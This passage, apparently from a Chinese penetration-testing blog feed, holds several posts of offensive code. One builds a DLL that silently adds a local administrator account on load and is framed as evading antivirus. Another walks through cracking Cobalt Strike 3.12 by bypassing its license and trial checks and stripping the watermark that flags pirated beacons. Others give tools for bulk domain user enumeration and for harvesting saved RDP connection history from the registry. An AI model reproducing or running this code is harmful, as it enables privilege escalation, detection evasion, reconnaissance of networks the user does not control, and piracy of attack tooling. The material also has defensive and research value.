class="string">L"Administrators"</span>, <span class="number">3</span>, (LPBYTE)&amp;account, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二）dll生成"><a href="#二）dll生成" class="headerlink" title="二）dll生成"></a>二）dll生成</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#ifndef UNICODE</span><br><span class="line">#define UNICODE</span><br><span class="line">#endif</span><br><span class="line">#pragma comment(lib,&quot;netapi32&quot;)</span><br><span class="line"></span><br><span class="line">#include  &lt;stdio.h&gt;</span><br><span class="line">#include  &lt;windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;  </span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include  &lt;lm.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;atlimage.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int NetUserAdd()</span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123;</span><br><span class="line">switch (dwReason) &#123;</span><br><span class="line">case DLL_PROCESS_ATTACH:</span><br><span class="line">NetUserAdd();</span><br><span class="line">break;</span><br><span class="line">case DLL_PROCESS_DETACH:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译代码的时候，选择MT，所有的依赖文件都会编进去。<br><img src="/image/创建用户，并添加至管理组/blog_2018-11-15_11-35-4320.png" alt="blog_2018-11-15_11-35-4320"></p><h2 id="0x02-备注"><a href="#0x02-备注" class="headerlink" title="0x02 备注"></a>0x02 备注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">支持最低客户端:Windows 2000 Professional [仅desktop apps]</span><br><span class="line">支持最低服务器:Windows 2000 Server [仅desktop apps]</span><br><span class="line">目标平台: Windows</span><br><span class="line">Header: lmaccess.h (include Lm.h)</span><br><span class="line">Library: Netapi32.lib</span><br><span class="line">DLL: Netapi32.dll</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 因有些需求，需要本地/远程添加用户。所以直接选择&lt;code&gt;Windows API函数&lt;/code&gt;进行编写，因为部分杀软限制了&lt;code&gt;CMD&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C++" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike 3.12 破解</title>
    <link href="https://rcoil.me/2018/10/CobaltStrike-3-12-%E7%A0%B4%E8%A7%A3/"/>
    <id>https://rcoil.me/2018/10/CobaltStrike-3-12-破解/</id>
    <published>2018-10-21T07:40:19.000Z</published>
    <updated>2018-11-17T04:27:44.529Z</updated>
    
    <content type="html"><![CDATA[<p>听说有更新，所以就拿来看看，按照3.8的破解流程。<br><a id="more"></a></p><h2 id="0x00-Cobalt-Strike3-12-下载"><a href="#0x00-Cobalt-Strike3-12-下载" class="headerlink" title="0x00 Cobalt Strike3.12 下载"></a>0x00 Cobalt Strike3.12 下载</h2><p>原版：<a href="https://github.com/microidz/Cobaltstrike-Trial" target="_blank" rel="noopener">https://github.com/microidz/Cobaltstrike-Trial</a></p><p>校验：<a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p><p>xor.bin：<a href="https://github.com/verctor/CS_xor64" target="_blank" rel="noopener">https://github.com/verctor/CS_xor64</a></p><p>破解记录</p><h2 id="0x01-文件文件位置"><a href="#0x01-文件文件位置" class="headerlink" title="0x01 文件文件位置"></a>0x01 文件文件位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">common/License.class  # 修改时间及提示框</span><br><span class="line">common/ArtifactUtils.class  # 去除后门特征指纹</span><br><span class="line">server/ProfileEdits.class # 去除后门特征指纹</span><br><span class="line">aggressor/dialogs/ListenerDialog.class  # 去除listener个数限制</span><br><span class="line">aggressor/AggressorClient.class  # 标题栏修改</span><br><span class="line">resources/xor.bin  # 放入xor.bin文件</span><br><span class="line">resources/xor64.bin  # 放入xor.bin文件</span><br></pre></td></tr></table></figure><h2 id="0x02-License-class"><a href="#0x02-License-class" class="headerlink" title="0x02 License.class"></a>0x02 License.class</h2><p>首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行<code>jad.exe License.class</code>，jad目录下就会生成<code>License.jad</code>，修改后缀为<code>Java</code>，即是源码文件了。</p><p>这里将提供两种破解思路。</p><ul><li><p>(1) 直接修改试用时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">21L</span>;</span><br><span class="line">将<span class="number">21</span>天的试用期修改成</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">99999L</span>;</span><br></pre></td></tr></table></figure></li><li><p>(2) 修改isTrail的判断逻辑 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">修改成</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p>往下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization auth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line">修改成</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization authorization)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">同理</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseConsole</span><span class="params">(Authorization authorization)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-去除listener个数限制"><a href="#0x03-去除listener个数限制" class="headerlink" title="0x03 去除listener个数限制"></a>0x03 去除listener个数限制</h2><p>文件在<code>aggressor/dialogs/ListenerDialog.class</code></p><p>去除<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal)))</span><br><span class="line">        &#123;</span><br><span class="line">            DialogUtils.showError(<span class="string">"You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-后门特征指纹"><a href="#0x04-后门特征指纹" class="headerlink" title="0x04 后门特征指纹"></a>0x04 后门特征指纹</h2><p>存在后门特征指纹的其中两个地方</p><p>common/ArtifactUtils.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">packer.addString(<span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><p>server/ProfileEdits.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c2profile.addCommand(<span class="string">".http-get.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-post.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-stager.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x86"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x64"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="0x05-结果"><a href="#0x05-结果" class="headerlink" title="0x05 结果"></a>0x05 结果</h2><p>最后使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -classpath cobaltstrike.jar xxxx.java</span><br></pre></td></tr></table></figure></p><p>进行编译<br><img src="/image/CobaltStrike-3-12-破解/Snipaste_2018-11-08_17-38-29.PNG" alt="Snipaste_2018-11-08_17-38-29"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/2170" target="_blank" rel="noopener">https://xz.aliyun.com/t/2170</a><br><a href="https://www.cnblogs.com/ssooking/p/9825917.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/9825917.html</a><br><a href="https://www.bilibili.com/video/av34171888/" target="_blank" rel="noopener">https://www.bilibili.com/video/av34171888/</a><br><a href="https://github.com/Lz1y/cobalt_strike_3.12_patch" target="_blank" rel="noopener">https://github.com/Lz1y/cobalt_strike_3.12_patch</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说有更新，所以就拿来看看，按照3.8的破解流程。&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】批量Net-User</title>
    <link href="https://rcoil.me/2018/08/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User/"/>
    <id>https://rcoil.me/2018/08/【域渗透】-批量Net-User/</id>
    <published>2018-08-01T09:32:25.000Z</published>
    <updated>2018-11-27T03:29:37.113Z</updated>
    
    <content type="html"><![CDATA[<p>域内批量执行<code>net user Uname /domain</code></p><a id="more"></a><h2 id="0x00使用场景"><a href="#0x00使用场景" class="headerlink" title="0x00使用场景"></a>0x00使用场景</h2><p>在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。<br>查找域用户对应的<code>Full Name</code>信息，从而确认目标任务对应的域用户。</p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p>代码其实很简单，使用C#进行编写，可自行编译。</p><p>将所有域用户导入<code>user.txt</code>中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行<code>net user Uname /domain</code>，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line">namespace domain</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">        Console.WriteLine(&quot;Tools By RcoIl \r&quot;);</span><br><span class="line">            string currentDirectory = Environment.CurrentDirectory;</span><br><span class="line">            string text = currentDirectory + &quot;\\user.txt&quot;; // 文件绝对路径</span><br><span class="line">            if (!File.Exists(text))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;File not found &quot; + text); </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                FileStream stream = new FileStream(text, FileMode.Open, FileAccess.Read); // 打开文本</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader streamReader = new StreamReader(stream, Encoding.Default); // 实例化</span><br><span class="line">                    try</span><br><span class="line">                    &#123;</span><br><span class="line">                        while (!streamReader.EndOfStream) // 读取文本</span><br><span class="line">                        &#123;</span><br><span class="line">                            string text2;</span><br><span class="line">                            if ((text2 = streamReader.ReadLine()) != null &amp;&amp; text2.Length != 0) </span><br><span class="line">                            &#123;</span><br><span class="line">                                string id = text2;</span><br><span class="line">                                Program.Check(id);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    finally</span><br><span class="line">                    &#123;</span><br><span class="line">                        if (streamReader != null)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ((IDisposable)streamReader).Dispose();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                finally</span><br><span class="line">                &#123;</span><br><span class="line">                    if (stream != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        ((IDisposable)stream).Dispose();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Console.WriteLine(&quot;============================================================&quot;);</span><br><span class="line">                Console.WriteLine(&quot;Finish!&quot;);</span><br><span class="line">                GC.Collect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void Check(string id)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.ProcessStartInfo proccessStartInfo = new System.Diagnostics.ProcessStartInfo(&quot;net&quot;, &quot;user &quot; + id + &quot; /domain&quot;);</span><br><span class="line">            proccessStartInfo.CreateNoWindow = true;</span><br><span class="line">            System.Diagnostics.Process proc = new System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;;</span><br><span class="line"></span><br><span class="line">            proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息</span><br><span class="line">            proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动</span><br><span class="line">            proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口</span><br><span class="line">            proc.Start();  // 启动程序</span><br><span class="line"></span><br><span class="line">            string outlist = proc.StandardOutput.ReadToEnd(); // 获取cmd窗口的输出信息</span><br><span class="line"></span><br><span class="line">            Regex reg = new Regex(&quot;.*ame.*&quot;);</span><br><span class="line">            MatchCollection result = reg.Matches(outlist);</span><br><span class="line">            Console.WriteLine(&quot;============================================================&quot;);</span><br><span class="line">            foreach (Match match in result)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(match);</span><br><span class="line">            &#125;</span><br><span class="line">            proc.WaitForExit(); // 等待程序执行完退出进程</span><br><span class="line">            proc.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果图：</p><p><img src="/image/域-批量Net-User/1.png" alt=""></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>在域内使用<code>dsquery</code>查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域内批量执行&lt;code&gt;net user Uname /domain&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于windows的RDP连接记录</title>
    <link href="https://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/"/>
    <id>https://rcoil.me/2018/05/关于windows的RDP连接记录/</id>
    <published>2018-05-12T03:13:20.000Z</published>
    <updated>2018-11-30T10:29:24.752Z</updated>
    
    <content type="html"><![CDATA[<p>关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次成功连接到远程主机时，RDP客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动<code>mstsc.exe</code>时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。</p><p>从安全角度来讲，这是极不安全的。</p><h2 id="0x01-获取RDP连接历史记录"><a href="#0x01-获取RDP连接历史记录" class="headerlink" title="0x01 获取RDP连接历史记录"></a>0x01 获取RDP连接历史记录</h2><p>至于获得历史记录的思路及细节实现思路，请转至<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">三好学生</a>师傅的博客，此处仅作为记录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">This script will list the logged-in users' RDP Connections History.</span></span><br><span class="line"><span class="comment">Author: 3gstudent@3gstudent</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$AllUser</span> = <span class="built_in">Get-WmiObject</span> -Class Win32_UserAccount</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$User</span> <span class="keyword">in</span> <span class="variable">$AllUser</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$RegPath</span> = <span class="string">"Registry::HKEY_USERS\"</span>+<span class="variable">$User</span>.SID+<span class="string">"\Software\Microsoft\Terminal Server Client\Servers\"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span>.Name</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"SID:"</span><span class="variable">$User</span>.SID</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"Status:"</span><span class="variable">$User</span>.Status</span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123; </span><br><span class="line"><span class="variable">$QueryPath</span> = dir <span class="variable">$RegPath</span> -Name -ErrorAction Stop</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">Catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Name</span> <span class="keyword">in</span> <span class="variable">$QueryPath</span>)</span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="variable">$User</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="variable">$RegPath</span><span class="variable">$Name</span> -ErrorAction Stop).UsernameHint</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"Server:"</span><span class="variable">$Name</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Catch</span>  </span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据三好学生师傅的PowerShell改写了C#版本，虽然代码不怎么好看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using Microsoft.Win32;</span><br><span class="line"></span><br><span class="line">namespace SavedRDPConnections</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        public static string GetRegValue(string hive, string path, string value)</span><br><span class="line">        &#123;</span><br><span class="line">            string regKeyValue = &quot;&quot;;</span><br><span class="line">            if (hive == &quot;HKCU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (hive == &quot;HKU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 